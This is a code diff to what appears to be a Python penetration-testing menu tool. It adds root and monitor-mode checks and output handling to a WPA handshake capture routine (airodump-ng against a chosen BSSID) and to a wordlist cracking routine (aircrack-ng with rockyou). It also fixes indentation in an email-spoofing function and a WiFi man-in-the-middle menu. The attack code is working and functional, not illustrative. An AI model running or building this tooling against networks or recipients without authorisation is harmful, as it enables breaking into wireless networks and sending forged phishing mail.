@@ -62,15 +62,7 @@ class Spinner:
             self.thread.join()
         print("\r" + " " * (len(self.message) + 4) + "\r", end='')
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def color_menu_numbers(menu_text):
-    # Replace numbers at the start of lines with blue colored numbers
-    return re.sub(r'^(\s*)(\d+)([.])', r'\1' + Colors.OKBLUE + r'\2\3' + Colors.ENDC, menu_text, flags=re.MULTILINE)
-
 def print_menu_with_header(menu_text):
-    clear_screen()
     print(BANNER)
     print(DISCLAIMER)
     print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
@@ -83,6 +75,14 @@ def print_menu_no_clear(menu_text):
     print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
     print(color_menu_numbers(menu_text))
     print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
+
+# Utility to color menu numbers (e.g., '1.', '2.', etc.) in cyan
+import re
+def color_menu_numbers(menu_text):
+    # Replace numbers at the start of lines (e.g., '1.', '2.') with colored versions
+    def repl(match):
+        return f"{Colors.OKCYAN}{match.group(0)}{Colors.ENDC}"
+    return re.sub(r"^\s*\d+\. ", repl, menu_text, flags=re.MULTILINE)
 
 BANNER = f"""
 {Colors.OKCYAN}
@@ -371,8 +371,8 @@ def spoof_email():
     try:
         result = subprocess.run(["sendmail", recipient], input=message.encode(), capture_output=True, text=True)
         if result.returncode == 0:
-        print("[+] Spoofed email sent.")
-        log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
+            print("[+] Spoofed email sent.")
+            log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
         else:
             print(f"[-] sendmail failed: {result.stderr}")
             print("[!] Troubleshooting: Ensure sendmail is configured and your system allows local mail delivery.")
@@ -706,28 +706,90 @@ def wifi_scan():
 
 def wifi_handshake_capture():
     print("[+] Capture WPA handshake (requires monitor mode and root)...")
+    if not check_root():
+        print("[-] Root privileges required.")
+        return
     iface = input("Wireless interface (e.g. wlan0): ").strip()
+    if not check_monitor_mode(iface):
+        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
+        return
+    if shutil.which("airodump-ng") is None:
+        print("[-] airodump-ng not found. Please install aircrack-ng suite.")
+        return
     bssid = input("Target BSSID (AP MAC): ").strip()
     channel = input("Channel: ").strip()
-    out_file = input("Output file (default: handshake.cap): ").strip() or "handshake.cap"
-    print("[*] Enabling monitor mode...")
-    subprocess.run(["sudo", "airmon-ng", "start", iface])
-    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
+    out_file = input("Output file prefix (default: handshake): ").strip() or "handshake"
+    mon_iface = iface
+    if not iface.endswith("mon"):
+        mon_iface = iface + "mon"
+        print("[*] Enabling monitor mode...")
+        subprocess.run(["sudo", "airmon-ng", "start", iface])
     print(f"[*] Using monitor interface: {mon_iface}")
     print("[*] Capturing handshake. Press Ctrl+C when done.")
     try:
-        subprocess.run(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_file.replace('.cap',''), mon_iface])
+        proc = subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_file, mon_iface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        if proc.stdout is not None:
+            for line in proc.stdout:
+                print(line, end='')
+        proc.wait()
     except KeyboardInterrupt:
         print("[!] Capture stopped.")
     subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
-    print(f"[+] Handshake saved to {out_file}")
+    # Detect the actual .cap file name
+    cap_file = f"{out_file}-01.cap"
+    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
+        print(f"[+] Handshake capture file: {cap_file}")
+        # Check for handshake presence
+        if shutil.which("aircrack-ng"):
+            print("[*] Checking for handshake in capture file...")
+            try:
+                result = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null", cap_file], capture_output=True, text=True)
+                print(result.stdout)
+                if "1 handshake" in result.stdout or "handshake(s)" in result.stdout:
+                    print(f"[+] Handshake(s) detected in {cap_file}!")
+                else:
+                    print(f"[-] No handshake detected in {cap_file}. Try recapturing or deauthing a client.")
+            except Exception as e:
+                print(f"[-] Error running aircrack-ng for handshake check: {e}")
+        else:
+            print("[!] aircrack-ng not found. Cannot check for handshake presence.")
+    else:
+        print(f"[-] Handshake file {cap_file} not found or empty. Capture may have failed.")
 
 def wifi_crack_handshake():
     print("[+] Crack WPA/WPA2 handshake with aircrack-ng or hashcat...")
+    if shutil.which("aircrack-ng") is None:
+        print("[-] aircrack-ng not found. Please install aircrack-ng.")
+        return
     cap_file = input("Handshake .cap file: ").strip()
+    if not os.path.exists(cap_file):
+        print(f"[-] File {cap_file} not found.")
+        return
     wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+    if not os.path.exists(wordlist):
+        print(f"[-] Wordlist {wordlist} not found.")
+        return
     print("[*] Cracking with aircrack-ng...")
-    subprocess.run(["aircrack-ng", "-w", wordlist, cap_file])
+    save = input("Save results to file? (y/N): ").strip().lower() == 'y'
+    if save:
+        out_file = input("Output file (default: aircrack_result.txt): ").strip() or "aircrack_result.txt"
+        with open(out_file, "w") as f:
+            try:
+                proc = subprocess.Popen(["aircrack-ng", "-w", wordlist, cap_file], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                if proc.stdout is not None:
+                    for line in proc.stdout:
+                        print(line, end='')
+                        f.write(line)
+                proc.wait()
+                print(f"[+] Results saved to {out_file}")
+            except Exception as e:
+                print(f"[-] aircrack-ng failed: {e}")
+    else:
+        try:
+            proc = subprocess.Popen(["aircrack-ng", "-w", wordlist, cap_file])
+            proc.communicate()
+        except Exception as e:
+            print(f"[-] aircrack-ng failed: {e}")
     # Optionally, add hashcat support here
 
 def wifi_deauth_attack():
@@ -1100,7 +1162,7 @@ def wifi_mitm_menu():
 5. Bettercap (Full WiFi MITM)
 0. Back
 """
-while True:
+    while True:
         print_menu_no_clear(menu_text)
         choice = input("[WiFi MITM] Select Option > ").strip()
         if choice == "1":
@@ -1826,7 +1888,7 @@ def interactive_menu_select(options, message="Select Option > ", tooltips=None):
 
 def print_core_menu(page):
     menu_text = "\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n"
-    print_menu_with_header(menu_text)
+    print_menu_no_clear(menu_text)
 
 current_page = 0
 while True:
